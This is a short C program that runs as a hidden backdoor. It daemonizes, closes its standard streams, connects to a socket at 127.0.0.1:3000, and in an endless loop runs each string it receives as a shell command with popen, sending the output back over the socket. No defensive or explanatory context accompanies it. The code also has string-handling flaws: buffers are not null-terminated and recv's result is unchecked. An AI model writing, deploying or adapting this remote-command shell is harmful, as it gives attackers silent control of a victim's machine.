#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>

#define PORT 3000

int main(int argc, char *argv[])
{
    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }
    
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &address.sin_addr.s_addr);
    memset(&address.sin_zero, 0, sizeof(address.sin_zero));

    if(connect(fd, (const struct sockaddr*)&address, (socklen_t)sizeof(address)) < 0)
    {
        exit(EXIT_FAILURE);
    }
    
    FILE *output;
    char buffer[1000];
    
    int i;
    while(true)
    {
        recv(fd, buffer, 1000, 0);
        output = popen(buffer, "r");
        i = 1;
        char byte, *response = calloc(1, sizeof(char));
        while(fread(&byte, sizeof(char), 1, output) > 0)
        {
            response[i-1] = byte;
            i++;
            response = realloc(response, i * sizeof(char));
        }
        send(fd, response, strlen(response), 0);
        memset(buffer, 0, 1000);
        memset(response, 0, i);
        free(response);
    }

    close(fd);
    return(0);
}